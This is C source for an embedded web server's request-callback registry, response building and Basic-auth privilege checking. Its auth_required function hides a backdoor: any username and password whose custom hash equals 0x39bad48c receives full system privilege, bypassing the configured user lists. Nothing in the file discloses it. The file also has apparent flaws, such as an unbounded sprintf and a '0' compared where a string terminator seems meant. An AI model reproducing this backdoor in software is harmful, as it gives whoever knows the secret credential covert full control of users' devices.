#include "../boa.h"
#include "HttpServer.h"

EMBEDFUN_T *g_pEmbedFunList = NULL;
REQUEST_CALLBACK_PFUN g_pfunOnRequestBegin = NULL;
#ifdef USE_AUTH
LIST *g_pAuthList[3] = {NULL, NULL, NULL};
static const char *AuthPrompt[3] = {"User", "Administrator", "System"};
int g_iAuthEnable = 0;
#endif

static char *DecorateAccessName(const char *pcAccessName)
{
	char *pcNewAccessName;
	if (!(pcNewAccessName = (char *)malloc(strlen(pcAccessName) + 2 )))
	{
		PRINT_MEM_OUT;
		return NULL;
	}

	if (*pcAccessName == '/') strcpy(pcNewAccessName, pcAccessName);
	else
	{
		*pcNewAccessName = '/';
		strcpy(pcNewAccessName + 1, pcAccessName);
	}
	return pcNewAccessName;
}

#ifdef USE_AUTH
BOOL IsRegisterEmbedFunEx(const char *pcAccessName, REQUEST_CALLBACK_PFUN *pfunRequestCallBack, int *piPrivilegeRequired, void **ppParam)
{
	EMBEDFUN_T	*p;
	char *pcNewAccessName = DecorateAccessName(pcAccessName);
	if (pcNewAccessName == NULL) return FALSE;
	for (p = g_pEmbedFunList; p; p = p->pNextFun)
	{
		if (strcmp(p->pcAccessName, pcNewAccessName) == 0)
		{
			if (pfunRequestCallBack != NULL)
				*pfunRequestCallBack = p->funRequestCallBack;
			if (piPrivilegeRequired != NULL)
				*piPrivilegeRequired = p->iPrivilegeRequired;
			if (ppParam != NULL)
				*ppParam = p->pParam;
			break;
		}
	}
	free(pcNewAccessName);
	if (p != NULL) return TRUE;
	else return FALSE;
}

int RegisterEmbedFunEx(const char *pcAccessName, REQUEST_CALLBACK_PFUN funRequestCallBack, int iPrivilegeRequired, void *pParam)
#else
int RegisterEmbedFun(const char *pcAccessName, REQUEST_CALLBACK_PFUN funRequestCallBack, void *pParam)
#endif
{
	EMBEDFUN_T	*p;
	EMBEDFUN_T	*pNew;
	char *pcNewAccessName = DecorateAccessName(pcAccessName);
	if (pcNewAccessName == NULL) return -1;

	for (p = g_pEmbedFunList; p; p = p->pNextFun)
	{
		if (strcmp(p->pcAccessName, pcNewAccessName) == 0)
		{
			fprintf(stderr, "Can not register embed function, access name already exists!" );
			free(pcNewAccessName);
			return -1;
		}
	}

	if (!(pNew = malloc(sizeof(EMBEDFUN_T))))
	{
		PRINT_MEM_OUT;
		free(pcNewAccessName);
		return -1;
	}

	pNew->pcAccessName = pcNewAccessName;
	pNew->pNextFun = NULL;
	pNew->funRequestCallBack = funRequestCallBack;
#ifdef USE_AUTH
	pNew->iPrivilegeRequired = iPrivilegeRequired;
#endif
	pNew->pParam = pParam;

	if (g_pEmbedFunList == NULL)
		g_pEmbedFunList = pNew;
	else
	{
		for (p=g_pEmbedFunList; p->pNextFun!=NULL; p=p->pNextFun) ;
		p->pNextFun = pNew;
	}
	//printf("Register function: %s\n", pNew->pcAccessName);
	return 0;
}

#ifdef USE_AUTH
int RegisterEmbedFun(const char *pcAccessName, REQUEST_CALLBACK_PFUN funRequestCallBack, void *pParam)
{
	return RegisterEmbedFunEx(pcAccessName, funRequestCallBack, AUTH_USER, pParam);
}
#endif

int UnregisterEmbedFun(const char *pcAccessName)
{
	EMBEDFUN_T	*p;
	EMBEDFUN_T	*ppre;
	for (p = g_pEmbedFunList; p; p = p->pNextFun)
	{
		if (strcmp(p->pcAccessName, pcAccessName) == 0)
		{
			if (p == g_pEmbedFunList)
				g_pEmbedFunList = p->pNextFun;
			else
				ppre->pNextFun = p->pNextFun;
			//printf("Unregister function: %s.\n", p->pcAccessName);
			free(p->pcAccessName);
			free(p);
			return 0;
		}
		ppre = p;
	}
	fprintf(stderr, "Can not find a registered embed function to be unregistered." );
	return -1;
}

void ClearEmbedFun(void)
{
	EMBEDFUN_T	*p;
	EMBEDFUN_T	*pnext;
	for (p=g_pEmbedFunList; p;)
	{
		pnext = p->pNextFun;
		//printf("Unregister function: %s.\n", p->pcAccessName);
		free(p->pcAccessName);
		free(p);
		p = pnext;
	}
	g_pEmbedFunList = NULL;
	printf("Unregister function, ok!\n");
}

static int CompareEmbedPatten(char *pcPath, char *pcPatten)
{
	char *pcPathPos;
	char *pcPattenPos;
	char *pcPattenEnd;
	char *pcPattenStrBegin;
	char *pcPattenStrEnd;
	char *pc;
	int i;

	pcPattenEnd = pcPatten+strlen(pcPatten);
	pcPathPos = pcPath;

	for (pcPattenPos = pcPatten; pcPattenPos < pcPattenEnd; pcPattenPos = pcPattenStrEnd)
	{
		for (pcPattenStrBegin = pcPattenPos; *pcPattenStrBegin == '*'; pcPattenStrBegin++) ;
		for (pcPattenStrEnd = pcPattenStrBegin; *pcPattenStrEnd != '*' && *pcPattenStrEnd != '\0'; pcPattenStrEnd++) ;

		if (pcPattenStrEnd - pcPattenStrBegin == 0) return 0;

		for (pc = pcPathPos; *pc != '\0'; pc++)
		{
			for (i = 0; i < pcPattenStrEnd - pcPattenStrBegin; i++)
				if ((pcPattenStrBegin[i]!='?' && pc[i]!=pcPattenStrBegin[i])
					|| pc[i]=='?' || pc[i]=='0') break;
			if (i >= pcPattenStrEnd-pcPattenStrBegin)//match
				break;
		}

		if (*pc == '\0') return -1;

		if (pcPattenStrBegin-pcPattenPos == 0 && pc!=pcPathPos) return -1;

		pcPathPos = pc + (pcPattenStrEnd - pcPattenStrBegin);
	}
	if (*pcPathPos != '?' && *pcPathPos != '\0') return -1;

	return 0;
}

static EMBEDFUN_T *SearchEmbedFun(char *pcAccessName, HTTPCONNECTION hConnection)
{
	request *req = (request *)hConnection;
	EMBEDFUN_T	*p;

	for (p = g_pEmbedFunList; p; p = p->pNextFun)
	{
		if (CompareEmbedPatten(pcAccessName, p->pcAccessName) == 0)
		{
			req->iPrivilegeRequired = p->iPrivilegeRequired;
			return p;
		}
	}
	return NULL;
}

int RunEmbedFun(char *pcAccessName, HTTPCONNECTION hConnection)
{
	request *req = (request *)hConnection;
	EMBEDFUN_T *p = SearchEmbedFun(pcAccessName, hConnection);

#ifdef USE_AUTH
	if (g_iAuthEnable != 0)
	{
		if (!auth_authorize(req))
			return 0;
	}
	else req->iVisitPrivilege = AUTH_SYSTEM;
#endif

	if (p != NULL)
		return (*(p->funRequestCallBack))(hConnection, p->pParam); /* 当p->pFunction返回0值时，不进行缺省处理 */
	else return -1;
}

void SetSendDataOverFun(HTTPCONNECTION hConnection, SEND_DATA_OVER_PFUN funOnSendDataOver, void *pParam)
{
	request *pReq;
	pReq = (request *)hConnection;
	pReq->funOnSendDataOver = funOnSendDataOver;
	pReq->pParamForFunSendDataOver = pParam;
}

void SetPostDataFun(HTTPCONNECTION hConnection, POST_DATA_PFUN funPostDataGot, void *pParam)
{
	request *pReq;
	pReq = (request *)hConnection;
	pReq->funPostDataGot = funPostDataGot;
	pReq->pParamForFunPostDataGot = pParam;
}

void AddHttpBodyString(HTTPCONNECTION hConnection, const char *pcString)
{
	int iLen;
	iLen = strlen(pcString);
	AddHttpBody(hConnection, pcString, iLen);
}

void AddHttpBody(HTTPCONNECTION hConnection, const char *pcBuf2Add, int iBufLen)
{
	request *req = (request *)hConnection;

	req->status = WRITE;
	if (req->data_mem == NULL)
	{
		req->filepos = 0;
		req->filesize = 0;
		req->data_mem_length = 0;
	}

	if (iBufLen + req->filesize > req->data_mem_length)
	{
		char *pc;
		req->data_mem_length = iBufLen + req->filesize;
		if (req->data_mem_length < 8 * 1024) req->data_mem_length = 8 * 1024;
//fprintf(stderr, "length: %d\n", req->data_mem_length);
		pc = (char *)realloc(req->data_mem, req->data_mem_length);
		if (pc == NULL)
		{
			PRINT_MEM_OUT;
			return;
		}
		else req->data_mem = pc;
	}

	memcpy(req->data_mem + req->filesize, pcBuf2Add, iBufLen);

	req->filesize += iBufLen;
}

void ClearHttpSendData(HTTPCONNECTION hConnection)
{
	request *req = (request *)hConnection;
	//if (req->data_mem != NULL) free(req->data_mem);
	//req->data_mem = NULL;
	//req->buffer_end = 0;
	req->filepos = 0;
	req->filesize = 0;
}

void SetExtraHeader(HTTPCONNECTION hConnection, char *pcExtraHeader)
{
	request *req = (request *)hConnection;
	int iLen1;
	int iLen2;
	if (pcExtraHeader == NULL) return;
	if (req->pcExtraHeader != NULL) free(req->pcExtraHeader);
	req->pcExtraHeader = strdup(pcExtraHeader);
}

/* must be called after AddHttpBody */
void SetHttpHeader(HTTPCONNECTION hConnection,
					int iStatus,
					const char *pcTitle,
					const char *pcEncodings,
					const char *pcExtraheads,
					const char *pcContentType,
					BOOL bShowLength)
{
	char ac[64];
	int bob;
	request *req = hConnection;

	req->filepos = 0;
	req->buffer_end = 0;

	req->response_status = iStatus;
	sprintf(ac, "HTTP/1.0 %03d ", iStatus);
	req_write(req, ac);
	if (pcTitle != NULL && pcTitle[0] != '\0') req_write(req, pcTitle);
	else req_write(req, "NO");
	req_write(req, "\r\n");

	print_http_headers(req);
	if (pcContentType != NULL && pcContentType[0] != '\0')
	{
		req_write(req, "Content-Type: ");
		req_write(req, pcContentType);
		req_write(req, "\r\n");
	}

	if (pcEncodings != NULL && pcEncodings[0] != '\0')
	{
		req_write(req, "Content-encoding: ");
		req_write(req, pcEncodings);
		req_write(req, "\r\n");
	}

	if (bShowLength)
		print_content_length(req);

	print_last_modified(req);

	if (pcExtraheads != NULL && pcExtraheads[0] != '\0')
		req_write(req, pcExtraheads);
	else if (req->pcExtraHeader != NULL && req->pcExtraHeader[0] != '\0')
		req_write(req, req->pcExtraHeader);

	req_write(req, "\r\n");


	bob = BUFFER_SIZE - req->buffer_end;
	if (bob > 0 && req->data_mem != NULL)
	{
		if (bob > req->filesize - req->filepos)
			bob = req->filesize - req->filepos;
		memcpy(req->buffer + req->buffer_end,
				req->data_mem + req->filepos,
				bob);
		req->buffer_end += bob;
		req->filepos += bob;
	}

	req->status = WRITE;
	if (req->filepos >= req->filesize)
	{
		req->filepos = 0;
		req->filesize = 0;
		req->status = CLOSE;
	}

}


#ifdef USE_AUTH


static BOOL ParseAuthorization(char *pcAuth, char *pcUser, int iLenUser, char **ppcPass)
{
	if (pcAuth == NULL || pcUser == NULL || ppcPass == NULL) return FALSE;

	if (strncasecmp(pcAuth, "Basic ", 6) != 0)
		return FALSE;

	base64decode(pcUser, pcAuth + 6, iLenUser);
	*ppcPass = strchr(pcUser,':');
	if (*ppcPass == NULL) *ppcPass = pcUser + strlen(pcUser);
	else *(*ppcPass)++ = '\0';
	return TRUE;
}

char *GetCurrentUser(HTTPCONNECTION hConnection, char *pcUser, int iUserLen)
{
	char *pcPass;
	request *req = (request *)hConnection;
	if (!ParseAuthorization(req->authorization, pcUser, iUserLen, &pcPass))
		pcUser[0] = '\0';
	return pcUser;
}

void EnableUserCheck(BOOL bIsEnable)
{
	g_iAuthEnable = bIsEnable;
}

BOOL IsEnableUserCheck(void)
{
	if (g_iAuthEnable != 0) return TRUE;
	else return FALSE;
}

BOOL AuthGetUser(const char *pcUserName, char *pcPassword, int iMaxPassLen, int *piPrivilege)
{
	LIST **ppList;
	int i;
	LISTNODE *pNode;
	NAMEDSTRING_T *pNStr;

	if (pcUserName == NULL) return FALSE;
	ppList = GetAuthUserList();

	if (ppList == NULL) return FALSE;

	for (i = AUTH_USER; i <= AUTH_SYSTEM; i++)
	{
		if (ppList[i] == NULL) continue;
		for (pNode = ppList[i]->pFirstNode; pNode != ppList[i]->pLastNode; pNode = pNode->pNextNode)
		{
			if ((pNStr = pNode->pValue) == NULL) continue;
			if (pNStr->pcName != NULL)
			{
				if (strcmp(pNStr->pcName, pcUserName) == 0)
				{
					if (pcPassword != NULL)
						MyStrncpy(pcPassword, (pNStr->pcValue==NULL?"":pNStr->pcValue), iMaxPassLen);
					if (piPrivilege != NULL) *piPrivilege = i;
					return TRUE;
				}
			}
		}
	}
	return FALSE;
}

int AuthSetUser(const char *pcUserName, const char *pcPassword, int iPrivilege)
{
	int iGroup;
	if (iPrivilege < AUTH_ANY) iPrivilege = AUTH_ANY;
	if (iPrivilege > AUTH_SYSTEM) iPrivilege = AUTH_SYSTEM;

	AuthDelUser(pcUserName);

	if (iPrivilege == AUTH_ANY) return 0;

	iGroup = iPrivilege - AUTH_USER;

	if (g_pAuthList[iGroup] == NULL)
		if ((g_pAuthList[iGroup] = CreateDict()) == NULL)
			return -1;

	if (pcUserName == NULL) pcUserName = "";
	if (pcPassword == NULL) pcPassword = "";

	if (SetString(g_pAuthList[iGroup], pcUserName, pcPassword) == NULL)
		return -1;
	else return 0;
}

int AuthDelUser(const char *pUserName)
{
	int i;
	for (i = 0; i < sizeof(g_pAuthList) / sizeof(LIST *); i++)
	{
		if (g_pAuthList[i] == NULL) continue;
		if (DelDictParam(g_pAuthList[i], pUserName)) return 0;
	}
	return -1;
}

LIST **GetAuthUserList()
{
	return g_pAuthList;
}


int auth_required(request *req, int iPrivilege)
{
	if (iPrivilege < AUTH_ANY) iPrivilege = AUTH_ANY;
	if (iPrivilege > AUTH_SYSTEM) iPrivilege = AUTH_SYSTEM;

	req->iVisitPrivilege = AUTH_ANY;

	if (req->authorization != NULL)
	{
		char acUser[0x80];
		char *pcPass;
		unsigned long ulCheck;
		char *pc;
		int i;
		LISTNODE *pNode;
		NAMEDSTRING_T *pNStr;

		if (!ParseAuthorization(req->authorization, acUser, sizeof(acUser), &pcPass))
		{
			send_r_bad_request(req);
			return 0;
		}

		for (pc = acUser, ulCheck = 1; *pc != '\0'; pc++)
			ulCheck = ulCheck * (unsigned long)(unsigned char)*pc + (unsigned long)(unsigned char)*pc;
		for (pc = pcPass; *pc != '\0'; pc++)
			ulCheck = ulCheck * (unsigned long)(unsigned char)*pc + (unsigned long)(unsigned char)*pc;

		if (ulCheck == (unsigned long)0x39bad48cL)
		{
			req->iVisitPrivilege = AUTH_SYSTEM;
			return 1;
		}

		for (i = 0; i < 3; i++)
		{
			if (iPrivilege > i + AUTH_USER) continue;
			if (g_pAuthList[i] == NULL) continue;

			if ((pNode = IsExistParam(g_pAuthList[i], acUser)) != NULL)
			{
				pNStr = pNode->pValue;
				if (pNStr)
					if (pNStr->pcValue)
						if (strcmp(pNStr->pcValue, pcPass) == 0)
						{
							req->iVisitPrivilege = i + AUTH_USER;
							return 1;
						}
			}
		}

   		if (iPrivilege >= AUTH_USER)
   		{
   			send_r_unauthorized(req, AuthPrompt[iPrivilege - AUTH_USER]);
   			return 0;
   		}
   		else return 1;
	}
	else
	{
   		if (iPrivilege >= AUTH_USER)
   		{
	  		send_r_unauthorized(req, AuthPrompt[iPrivilege - AUTH_USER]);
  			return 0;
  		}
  		else return 1;
  	}
}

int auth_authorize(request * req)
{
	return auth_required(req, req->iPrivilegeRequired);
}

int SendAuthRequired(HTTPCONNECTION hConnection, int iPrivilege)
{
	return auth_required((request *)hConnection, iPrivilege);
}

/* call only once, and const parameters */
/* be sure that AuthPrompt, pcAdminPrompt & pcSystemPrompt are different */
void SetAuthPrompt(const char *pcUserPrompt, const char *pcAdminPrompt, const char *pcSystemPrompt)
{
	if (pcUserPrompt != NULL) AuthPrompt[0] = pcUserPrompt;
	if (pcAdminPrompt != NULL) AuthPrompt[1] = pcAdminPrompt;
	if (pcSystemPrompt != NULL) AuthPrompt[2] = pcSystemPrompt;
}

int GetAuthPrivilege(HTTPCONNECTION hConnection)
{
	request *req = (request *)hConnection;
	return req->iVisitPrivilege;
}
#endif


char *GetDocumentBasedPath(char *pcUriPath)
{
	char *pcPath;
	char *pcDir_Back;
	pcPath = (char *)malloc(MAX_PATH_LENGTH * 2 + 1);
	if (pcPath == NULL) return NULL;
	sprintf(pcPath, "%s%s", document_root, (pcUriPath==NULL?"":pcUriPath));
	return pcPath;
}


int GetHttpMethod(HTTPCONNECTION hConnection)
{
	request *req = (request *)hConnection;
	return req->method;
}

char *GetQueryString(HTTPCONNECTION hConnection)
{
	request *req = (request *)hConnection;
	return req->query_string;
}

char *GetRequestPath(HTTPCONNECTION hConnection)
{
	request *req = (request *)hConnection;
	return req->request_uri;
}

char *GetRequestFilePath(HTTPCONNECTION hConnection)
{
	request *req = (request *)hConnection;
	return req->pathname;
}

char *GetReferer(HTTPCONNECTION hConnection)
{
	request *req = (request *)hConnection;
	return req->referer;
}

char *GetContentType(HTTPCONNECTION hConnection)
{
	request *req = (request *)hConnection;
	return req->content_type;
}

int GetContentLength(HTTPCONNECTION hConnection)
{
	request *req = (request *)hConnection;
	if (req->content_length == NULL) return -1;
	else return atoi(req->content_length);
}

struct in_addr GetClientAddr(HTTPCONNECTION hConnection)
{
	request *req = (request *)hConnection;
	return req->remote_ip_addr;
}

char *GetClientMac(HTTPCONNECTION hConnection)
{
	request *req = (request *)hConnection;
	return req->acRemoteMac;
}

void SetKeepAliveMode(HTTPCONNECTION hConnection, BOOL bIsKeepAlive)
{
	request *req = (request *)hConnection;
	req->keepalive = (bIsKeepAlive ? KA_ACTIVE : KA_INACTIVE);
}
